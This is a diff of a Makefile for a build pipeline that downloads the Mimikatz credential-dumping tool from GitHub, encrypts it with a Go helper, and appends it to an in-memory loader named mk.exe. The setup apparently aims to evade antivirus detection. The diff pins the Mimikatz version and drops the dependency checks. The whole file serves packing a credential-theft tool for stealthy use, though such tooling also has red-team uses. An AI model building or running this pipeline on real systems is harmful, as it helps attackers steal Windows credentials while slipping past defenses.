@@ -5,27 +5,9 @@ compiler = amd64-mingw32msvc-gcc
 else
 ignored = $(error No compatible compiler found on system path)
 endif
+
 arch = amd64
-
-ifeq ("$(shell which go)", "")
-$(error go not found on system path)
-endif
-
-ifeq ("$(shell which 7z)", "")
-$(error 7z not found on system path)
-endif
-
-ifeq ("$(shell which curl)", "")
-$(error curl not found on system path)
-endif
-
-ifeq ("$(shell which jq)", "")
-$(error jq not found on system path)
-endif
-
-ifeq ("$(shell which cmake)", "")
-$(error cmake not found on system path)
-endif
+mimikatz_version = 2.1.1-20180527
 
 all: pack
 
@@ -51,7 +33,7 @@ MemoryModule:
 # Packing it inside of the loader
 pack: encrypt mimikatz.exe
 	cat mimi_encrypted >> mimikatz.exe
-	mv mimikatz.exe ek.exe
+	mv mimikatz.exe mk.exe
 
 # Encrypting the binary
 encrypt: crypt download
@@ -61,9 +43,11 @@ crypt: crypt.go
 	go build crypt.go
 
 download:
-	curl -s "https://api.github.com/repos/gentilkiwi/mimikatz/releases/latest" \
-       | jq -r '.assets[] | select(.name=="mimikatz_trunk.7z") | .browser_download_url' \
-       | xargs curl -OL
+	# curl -fssL "https://api.github.com/repos/gentilkiwi/mimikatz/releases/latest" \
+    #    | jq -r '.assets[] | select(.name=="mimikatz_trunk.7z") | .browser_download_url' \
+    #    | xargs curl -OL
+
+	curl -OL https://github.com/gentilkiwi/mimikatz/releases/download/$(mimikatz_version)/mimikatz_trunk.7z
 
 	# Test whether or not we actually got a 7z.
 	7z e -so mimikatz_trunk.7z x64/mimikatz.exe >> /dev/null
@@ -72,7 +56,7 @@ download:
 # Clean target. 
 CLEANDIRS = $(SUBDIRS:%=clean-%)
 clean: $(CLEANDIRS)
-	rm -f crypt mimikatz.exe mimikatz_trunk.7z mimi_encrypted
+	rm -f crypt mimikatz.exe mimikatz_trunk.7z mimi_encrypted mk.exe
 $(CLEANDIRS): 
 	$(MAKE) -C $(@:clean-%=%) clean
 clean-MemoryModule:
